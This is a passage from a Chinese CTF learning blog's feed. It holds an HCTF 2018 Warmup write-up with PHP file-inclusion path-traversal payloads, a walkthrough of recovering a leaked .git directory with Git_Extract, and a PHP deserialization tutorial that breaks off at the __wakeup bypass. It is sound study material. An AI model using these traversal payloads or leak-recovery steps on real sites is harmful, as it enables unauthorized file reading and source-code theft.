class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="comment">//需要同时满足三个条件：传入了file参数，并且是字符串，并且满足checkfile函数</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]; <span class="comment">//执行给出的file参数值</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> flag&#123;<span class="number">408</span>cfb51-<span class="number">0</span>d75-<span class="number">4976</span>-<span class="number">9</span>d2e-e431e5d0fd77&#125;</span><br></pre></td></tr></table></figure><p>先来介绍下两个函数mb_substr()+mb_strpos()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置</span><br><span class="line">    mb_strpos(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">):<span class="keyword">int</span></span><br><span class="line"><span class="comment">// haystack：要被检查的字符串。</span></span><br><span class="line"><span class="comment">// needle：要搜索的字符串</span></span><br><span class="line"></span><br><span class="line">**mb_substr()** 函数返回字符串的一部分。</span><br><span class="line">    mb_substr(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">):<span class="keyword">string</span></span><br><span class="line"><span class="comment">//str 必需。从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">//start 必需。规定在字符串的何处开始。</span></span><br><span class="line"><span class="comment">//ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾</span></span><br><span class="line"></span><br><span class="line">request() <span class="comment">//可以以get或者post提交参数</span></span><br><span class="line"><span class="keyword">include</span> <span class="comment">//文件包含,包含并运行文件中的内容</span></span><br><span class="line"><span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span> <span class="comment">//将$_page后拼接 ? </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">&amp;&amp; <span class="title">emmm</span>::<span class="title">checkFile</span>(<span class="params"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function">上面这代码表示 将<span class="title">request</span>的<span class="title">file</span>值 传入$<span class="title">page</span>，其实就是将<span class="title">file</span>参数传入到<span class="title">page</span>中</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如： </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">sub</span> (<span class="params">&amp;<span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$var</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span>=<span class="number">5</span>;</span><br><span class="line">    sub(<span class="variable">$num</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">将使 <span class="variable">$num</span> 变成 <span class="number">6</span>。这是因为在 sub 函数中变量 <span class="variable">$var</span> 指向了和 <span class="variable">$num</span> 指向的同一个内容。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    通过源码提示hin.php，访问之后得到flag在ffffllllaaaagggg中，所以我们肯定要使include包含这个文件，从而得到我们的flag。但是通过checkfile函数可知，返回true的条件是所传入的file参数值（或者是经过函数处理后的值）需要在白名单里，所以直接传入ffffllllaaaagggg肯定不得行。这是最终要的来啦，<strong>就是考虑题目给的函数，通过函数的处理的值使得我们能够返回true</strong>。所以构造payload为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.file=source.php?/../../../../../ffffllllaaaagggg</span><br><span class="line"><span class="number">2</span>.file=source.php%<span class="number">3</span>f/../../../../../ffffllllaaaagggg <span class="comment">//这里的%3f是 ? 经过ulr加密后的值，由于每次传参十，都会自动urldecode一次，所以等价于第一个</span></span><br><span class="line"><span class="number">3</span>.file=source.php%<span class="number">253</span>f/../../../../../ffffllllaaaagggg <span class="comment">//这里的%253f是 ? 经过两次ulr加密后的值，在经过一次自动处理以及checkfile函数里的urldecode函数处理一次后就等价于第一个了，同样可以返回true</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//说明一下../是返回上一级目录，首先在source.php?加一个 / ，使其成为不存在的目录，然后../就返回到source.php所在的目录，之后一次次试在哪个目录里，自己也可以在本地试试../的目录关系</span></span><br></pre></td></tr></table></figure><p>之后传入payload就会得到flag啦~</p><p><strong>再补充一下 ./   ../   / 的说明：</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">./</span> 表示当前目录下</span><br><span class="line"><span class="string">../</span> 表示上一级目录</span><br><span class="line">/ 表示根目录</span><br></pre></td></tr></table></figure><img src="/2021/11/18/buuctf%E7%BB%83%E4%B9%A0/1.png" alt="相对路径图片" style="zoom:80%;"><img src="/2021/11/18/buuctf%E7%BB%83%E4%B9%A0/2.png" alt="相对路径图片" style="zoom:118%;"><p>如图，以这个文件夹为例，在buu文件中，有2.png，那就表示为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/buuctf练习/</span><span class="number">1</span>.png</span><br></pre></td></tr></table></figure><p>在此目录下，有hello.md，那就表示为：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hello.<span class="built_in">md</span> 或者 hello.<span class="built_in">md</span></span><br></pre></td></tr></table></figure><p>如果2.png在上层目录的一个image文件下，那就是：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..<span class="regexp">/image/</span><span class="number">1</span>.png</span><br></pre></td></tr></table></figure><hr><p>最后吐槽一下自己，看了warmup题，看好长时间不会，哎，还是太菜了，慢慢学吧~</p><img src="/2021/11/18/buuctf%E7%BB%83%E4%B9%A0/bz.png" alt="相对路径图片" style="zoom:55%;">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-HCTF-2018-Warmup&quot;&gt;&lt;a href=&quot;#1-HCTF-2018-Warmup&quot; class=&quot;headerlink&quot; title=&quot;1.[HCTF 2018]Warmup&quot;&gt;&lt;/a&gt;1.[HCTF 2018]Warmup&lt;/h2&gt;&lt;p&gt;考察：p</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="buu练习" scheme="http://example.com/tags/buu%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>CNSS-2021-Recruit web复现</title>
    <link href="http://example.com/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-11-18T10:31:38.000Z</published>
    <updated>2021-11-20T14:42:06.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>在开始解答这道题之前，首先了解一下git的相关知识，以及git泄露的原理。</p><h4 id="1-git是什么"><a href="#1-git是什么" class="headerlink" title="1.git是什么"></a>1.git是什么</h4><p>  Git是<strong>分布式版本控制系统</strong>。</p><p>  <strong>版本控制系统</strong>就是在你每次进行每次操作时，都会记录下来，并且会使用相关的命令进行查取，也就是<strong>记录了你的日志</strong>。</p><p>  那何为分布式呢？分布式和集中式对立，不难理解集中式就是用一个中央服务器用来存储相关的文件，用户每次需要修改文件时，都需要再次从服务器上下载下来，修改完成之后再提交到服务器。而<strong>分布式就是每个人本地都有一套自己的完整版本库</strong>，这样修改自己的文件时就很方便。</p><h4 id="2-git一般工作流程"><a href="#2-git一般工作流程" class="headerlink" title="2.git一般工作流程"></a>2.git一般工作流程</h4><ol><li><p>从远程仓库中克隆 Git 资源作为<strong>本地仓库</strong>；</p></li><li><p>从本地仓库中checkout代码然后进行代码修改；</p></li><li><p>在提交本地仓库前先将代码提交到<strong>暂存区</strong>；</p></li><li><p>提交修改，提交到本地仓库；<strong>本地仓库中保存修改的各个历史版本</strong>；</p><img src="/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/1.jpg" alt="相对路径图片" style="zoom:55%;"></li></ol><h4 id="3-几个核心概念：工作区、暂存区、版本库、远程仓库、分支"><a href="#3-几个核心概念：工作区、暂存区、版本库、远程仓库、分支" class="headerlink" title="3.几个核心概念：工作区、暂存区、版本库、远程仓库、分支"></a>3.几个核心概念：工作区、暂存区、版本库、远程仓库、分支</h4><p>Workspace： 工作区，平时存放项目代码的地方</p><p>Index / Stage： 暂存区，用于临时存放你的改动，事实上它只是一个文件，保存即将提交到文件列表信息</p><p>Repository： 仓库区（或版本库，就是隐藏目录.git），就是安全存放数据的位置，这里面有你提交到所有版本的数据。其中HEAD指向最新放入仓库的版本</p><p>Remote： 远程仓库，托管代码的服务器，可以简单的认为是你项目组中的一台电脑用于远程数据交换</p><p>master：每次的提交Git都把它们串成一条时间线，这条时间线就是一个分支。截止到目前，只有一条时间线，在Git里这个分支叫主分支，即master分支。</p><img src="/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/2.jpg" alt="相对路径图片" style="zoom:55%;"><h4 id="4-git文件夹分析"><a href="#4-git文件夹分析" class="headerlink" title="4. .git文件夹分析"></a>4. .git文件夹分析</h4><p>hook: 存放一些sheel的地方。<br>info: 存放仓库的信息<br>object: 存放所有git对象的地方<br>refs: 存放提交hash的地方<br>config: github的配置信息<br>description：仓库的描述信息，主要给gitweb等git托管系统使用<br>HEAD: 映射到ref引用，能够找到下一次commit的前一次哈希值</p><h4 id="5-git泄露原理："><a href="#5-git泄露原理：" class="headerlink" title="5.git泄露原理："></a>5.git泄露原理：</h4><p>一般开发人员进行开发时，有这样的流程：</p><ol><li>初始化仓库 , 并将仓库托管在Coding或者Github上 , 便于远程协作/备份/部署</li><li>在本地进行网站开发 , 并定时提交commit , <strong>push到</strong>远程托管网站</li><li><strong>当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站pull到Web目录下</strong></li><li>网站正常运行</li></ol><p>所以漏洞就处在部署时：</p><ul><li>开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码<strong>pull到服务器的web目录下</strong>，如果忘记把.git文件删除，就造成此漏洞。<strong>利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。</strong></li><li>当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会<strong>将.git文件夹直接部署到线上环境</strong>，这就引起了git泄露漏洞。</li></ul><h4 id="6-相关工具"><a href="#6-相关工具" class="headerlink" title="6.相关工具"></a>6.相关工具</h4><p>知道网站存在git泄露之后，可以通过Githack、Git_extract等工具提取 .git 隐藏文件。</p><hr><p>下面就来解答这道题：Githacker</p><p>题目暗示和git有关，所以可能是git泄露。</p><p>首先下载工具Git_extract: <a href="https://github.com/gakki429/Git_Extract%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A">https://github.com/gakki429/Git_Extract，使用方法：</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 git_extract.py http:<span class="regexp">//</span>example.com<span class="regexp">/.git/</span>  <span class="comment">#注意，此工具和githack工具一样，都只能在python2中使用</span></span><br></pre></td></tr></table></figure><p>然后使用工具去下载此网站的 .git 文件:</p><img src="/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/3.jpg" alt="相对路径图片" style="zoom:55%;"><p>可以看到整个文件已经下载到目录里了：</p><img src="/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/6.jpg" alt="相对路径图片" style="zoom:55%;"><p>然后在下载到的 .git 文件里执行<strong>fsck（文件系统检测）命令</strong><br><code>git fsck --lost-found</code><br>这个命令会把悬空的blob恢复文件列举出来</p><img src="/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/4.jpg" alt="相对路径图片" style="zoom:55%;"><p>这时就可以通过<code>git show 11b2d674cc83c17990150726b4653bfe3c78c807</code> 命令查看当前哈希值对象的具体内容：</p><img src="/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/5.jpg" alt="相对路径图片" style="zoom:55%;"><hr><p>最后贴张图~呼呼  ^ _ ^</p><img src="/2021/11/18/CNSS-2021-Recruit-web%E5%A4%8D%E7%8E%B0/7.jpg" alt="相对路径图片" style="zoom:55%;">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Git泄露&quot;&gt;&lt;a href=&quot;#Git泄露&quot; class=&quot;headerlink&quot; title=&quot;Git泄露&quot;&gt;&lt;/a&gt;Git泄露&lt;/h2&gt;&lt;p&gt;在开始解答这道题之前，首先了解一下git的相关知识，以及git泄露的原理。&lt;/p&gt;
&lt;h4 id=&quot;1-git是什么</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="Git泄露" scheme="http://example.com/tags/Git%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>反序列化</title>
    <link href="http://example.com/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-11-17T07:32:32.000Z</published>
    <updated>2021-11-20T14:41:30.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h4 id="序列化函数：serialize："><a href="#序列化函数：serialize：" class="headerlink" title="序列化函数：serialize："></a>序列化函数：serialize：</h4><p>​    所有php里面的值都可以使用<strong>函数serialize()来返回一个包含字节流的字符串</strong>来表示。<strong>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;12345&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;hello admin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> CNSS();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果为：O:4:”CNSS”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;s:5:”12345”;}</p><p>下面解释一下其中的一些缩写符号：</p><p>a - array                          b - boolean<br>d - double                        i - integer<br>o - common object          r - reference<br>s - string                          C - custom object<br>O - class                          N - null<br>R - pointer reference       U - unicode string</p><p>所以知道缩写字符的意思后，便可以知道序列化后的内容的意思，同时也可以看出，序列化只保存了对象的属性，并不会保存方法：</p><p>​    O:4:”CNSS”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;s:5:”12345”;}                                                                                                             对象类型:长度:”类名”:<strong>类中变量的个数</strong>:{类型:长度:”值”;类型:长度:”值”;……}</p><h4 id="反序列化函数：unserialize"><a href="#反序列化函数：unserialize" class="headerlink" title="反序列化函数：unserialize:"></a>反序列化函数：unserialize:</h4><p>​    unserialize() 对单一的<strong>已序列化的变量</strong>进行操作，将其<strong>转换回 PHP 的值</strong>。 <strong>在解序列化一个对象前，这个对象的类必须在解序列化之前定义。</strong>下面看一个师傅举得例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$height</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$height</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;height = <span class="variable">$height</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$man</span>= <span class="string">&#x27;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:20;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$man</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#输出为：</span></span><br><span class="line"><span class="keyword">object</span>(man)<span class="comment">#1 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;Bob&quot;</span></span><br><span class="line">  [<span class="string">&quot;age&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">5</span>)</span><br><span class="line">  [<span class="string">&quot;height&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">20</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但反序列化之后的对象仍可以调用类中的方法，下面是一个师傅的例子：</p><p><img src="https://img-blog.csdnimg.cn/20190814112534807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="PHP反序列化漏洞："><a href="#PHP反序列化漏洞：" class="headerlink" title="PHP反序列化漏洞："></a>PHP反序列化漏洞：</h4><p>在学习反序列化漏洞之前先了解一些常见的<strong>魔法函数</strong>（PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法）：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__construct</span>   当一个对象创建时被调用，</span><br><span class="line"><span class="selector-tag">__destruct</span>   当一个对象销毁时被调用，</span><br><span class="line"><span class="selector-tag">__toString</span>   当一个对象被当作一个字符串被调用。</span><br><span class="line"><span class="selector-tag">__wakeup</span>()   使用<span class="selector-tag">unserialize</span>时触发，在反序列化之前先调用</span><br><span class="line"><span class="selector-tag">__sleep</span>()    使用<span class="selector-tag">serialize</span>时触发，在序列化之前先调用</span><br><span class="line"><span class="selector-tag">__destruct</span>()    对象被销毁时触发</span><br><span class="line"><span class="selector-tag">__call</span>()    在对象上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="selector-tag">__callStatic</span>()    在静态上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="selector-tag">__get</span>()    用于从不可访问的属性读取数据</span><br><span class="line"><span class="selector-tag">__set</span>()    用于将数据写入不可访问的属性</span><br><span class="line"><span class="selector-tag">__isset</span>()    在不可访问的属性上调用<span class="selector-tag">isset</span>()或<span class="selector-tag">empty</span>()触发</span><br><span class="line"><span class="selector-tag">__unset</span>()     在不可访问的属性上使用<span class="selector-tag">unset</span>()时触发</span><br><span class="line"><span class="selector-tag">__toString</span>()    把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line"><span class="selector-tag">__invoke</span>()   当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>下面引用一片大佬博客里的一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> test();  <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;echoP();   <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;    <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"><span class="variable">$s</span> =serialize(<span class="variable">$obj</span>);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$s</span>);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出为：</p><p><img src="/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211015211534584.png" alt="image-20211015211534584"></p><h4 id="绕过魔法函数的反序列化："><a href="#绕过魔法函数的反序列化：" class="headerlink" title="绕过魔法函数的反序列化："></a>绕过魔法函数的反序列化：</h4><h5 id="1-wakeup-魔法函数绕过：PHP反序列化漏洞CVE-2016-7124——当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过-wakeup-函数的执行。"><a href="#1-wakeup-魔法函数绕过：PHP反序列化漏洞CVE-2016-7124——当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过-wakeup-函数的执行。" class="headerlink" title="1.wakeup()魔法函数绕过：PHP反序列化漏洞CVE-2016-7124——当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 